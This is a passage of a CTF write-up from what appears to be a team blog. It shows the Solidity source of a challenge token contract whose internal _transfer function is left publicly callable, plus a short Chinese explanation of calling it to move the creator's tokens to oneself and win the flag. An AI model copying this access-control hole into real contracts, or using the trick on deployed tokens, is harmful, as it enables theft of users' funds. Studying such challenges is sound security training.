class="comment">/**</span></span><br><span class="line"><span class="comment">   * @dev Transfer tokens from one address to another</span></span><br><span class="line"><span class="comment">   * @param from address The address which you want to send tokens from</span></span><br><span class="line"><span class="comment">   * @param to address The address which you want to transfer to</span></span><br><span class="line"><span class="comment">   * @param value uint256 the amount of tokens to be transferred</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="function">function <span class="title">transferFrom</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    address from,</span></span></span><br><span class="line"><span class="function"><span class="params">    address to,</span></span></span><br><span class="line"><span class="function"><span class="params">    uint256 value</span></span></span><br><span class="line"><span class="function"><span class="params">  )</span></span></span><br><span class="line"><span class="function">    <span class="keyword">public</span></span></span><br><span class="line"><span class="function">    <span class="title">returns</span> <span class="params">(<span class="keyword">bool</span>)</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    require(value &lt;= _allowed[from][msg.sender]);</span><br><span class="line">    AirdropCheck();</span><br><span class="line"></span><br><span class="line">    _allowed[from][msg.sender] = _allowed[from][msg.sender].sub(value);</span><br><span class="line">    _transfer(from, to, value);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * @dev Transfer token for a specified addresses</span></span><br><span class="line"><span class="comment">  * @param from The address to transfer from.</span></span><br><span class="line"><span class="comment">  * @param to The address to transfer to.</span></span><br><span class="line"><span class="comment">  * @param value The amount to be transferred.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  function _transfer(address from, address to, uint256 value) &#123;</span><br><span class="line">    require(value &lt;= _balances[from]);</span><br><span class="line">    require(to != address(<span class="number">0</span>));</span><br><span class="line">    require(value &lt;= <span class="number">10000000</span>);</span><br><span class="line"></span><br><span class="line">    _balances[from] = _balances[from].sub(value);</span><br><span class="line">    _balances[to] = _balances[to].add(value);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract D2GBToken is ERC20 &#123;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">string</span> <span class="keyword">public</span> constant name = <span class="string">"D2GB"</span>;</span><br><span class="line">  <span class="built_in">string</span> <span class="keyword">public</span> constant symbol = <span class="string">"D2GB"</span>;</span><br><span class="line">  uint8 <span class="keyword">public</span> constant decimals = <span class="number">18</span>;</span><br><span class="line"></span><br><span class="line">  uint256 <span class="keyword">public</span> constant INITIAL_SUPPLY = <span class="number">20000000000</span> * (<span class="number">10</span> ** uint256(decimals));</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * @dev Constructor that gives msg.sender all of existing tokens.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  constructor() <span class="keyword">public</span> &#123;</span><br><span class="line">    _totalSupply = INITIAL_SUPPLY;</span><br><span class="line">    _balances[msg.sender] = INITIAL_SUPPLY;</span><br><span class="line">    initialized[msg.sender] = <span class="literal">true</span>;</span><br><span class="line">    emit Transfer(address(0), msg.sender, INITIAL_SUPPLY);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="comment">//flag</span></span><br><span class="line">  <span class="function">function <span class="title">PayForFlag</span><span class="params">(<span class="built_in">string</span> b64email)</span> <span class="keyword">public</span> payable <span class="title">returns</span> <span class="params">(<span class="keyword">bool</span> success)</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    require (_balances[msg.sender] &gt; <span class="number">10000000</span>);</span><br><span class="line">      <span class="function">emit <span class="title">GetFlag</span><span class="params">(b64email, <span class="string">"Get flag!"</span>)</span></span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>给了源码。<br>拿去部署下，很容易发现_transfer函数可以直接访问，即可以指定任意地址向某地址转账。<br>直接在交易中找创始人，调用该函数向自己的地址转题目要求i的金额就是。</p>

    </div>

    

    
        <div class="post-tags">
            <i class="fa fa-tags" aria-hidden="true"></i>
            <a href="/tags/ctf/">#ctf</a> <a href="/tags/re/">#re</a> <a href="/tags/web/">#web</a> <a href="/tags/crypto/">#crypto</a> <a href="/tags/pwn/">#pwn</a> <a href="/tags/misc/">#misc</a> <a href="/tags/writeup/">#writeup</a> <a href="/tags/hctf/">#hctf</a>
        </div>
    

    <!-- Comments -->
    

</div>
        </section>

    </div>
</div>


</div>

<!-- Footer -->
<div class="push"></div>

<footer class="footer-content">
    <div class="container">
        <div class="row">
            <div class="col-xs-12 col-sm-12 col-md-6 col-lg-6 footer-about">
                <h2>About</h2>
                <p>
                    De1ta-Team: De1iver the tea
                </p>
            </div>
            
    <div class="col-xs-6 col-sm-6 col-md-3 col-lg-3 recent-posts">
        <h2>Recent Posts</h2>
        <ul>
            
            <li>
                <a class="footer-post" href="/2099/05/22/Write-ups-for-CTFs/">Write ups for CTFs</a>
            </li>
            
            <li>
                <a class="footer-post" href="/2019/08/19/SUCTF2019/">SUCTF 2019 Writeup</a>
            </li>
            
            <li>
                <a class="footer-post" href="/2019/08/08/de1ctf2019 Writeup/">De1ctf 2019 Writeup</a>
            </li>
            
            <li>
                <a class="footer-post" href="/2019/06/24/sctf2019/">SCTF 2019 Writeup</a>
            </li>
            
        </ul>
    </div>



            
        </div>
        <div class="row">
            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
                <ul class="list-inline footer-social-icons">
                    
                    <li class="list-inline-item">
                        <a href="https://github.com/De1ta-team">
                            <span class="footer-icon-container">
                                <i class="fa fa-github"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    
                    
                    
                    
                    
                    
                    
                    
                    <li class="list-inline-item">
                        <a href="/atom.xml">
                            <span class="footer-icon-container">
                                <i class="fa fa-rss"></i>
                            </span>
                        </a>
                    </li>
                    
                </ul>
            </div>
        </div>
        <div class="row">
            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
                <div class="footer-copyright">
                    @De1ta-Team. All right reserved
                </div>
            </div>
        </div>
    </div>
</footer>

<!-- After footer scripts -->

<!-- jQuery -->
<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>

<!-- Tween Max -->
<script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.18.5/TweenMax.min.js"></script>

<!-- Gallery -->
<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>

<!-- Custom JavaScript -->
<script src="/js/main.js"></script>

<!-- Disqus Comments -->



</body>

</html>